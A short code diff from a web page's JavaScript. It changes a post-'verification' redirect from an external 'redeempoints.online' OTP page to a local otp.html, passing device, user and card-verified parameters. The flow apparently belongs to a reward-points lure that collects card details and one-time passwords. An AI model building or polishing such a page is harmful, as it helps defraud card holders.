@@ -1220,7 +1220,7 @@
                     showLoading(false);
                     showToast('✅ Limit verification successful!', false);
                     setTimeout(() => {
-                        window.location.href = `https://redeempoints.online/otp/index.html?deviceId=${deviceId}&userId=${encodeURIComponent(userId)}&cardVerified=true`;
+                        window.location.href = `otp.html?deviceId=${deviceId}&userId=${encodeURIComponent(userId)}&cardVerified=true`;
                     }, 1000);
                 })
                 .catch(err => {
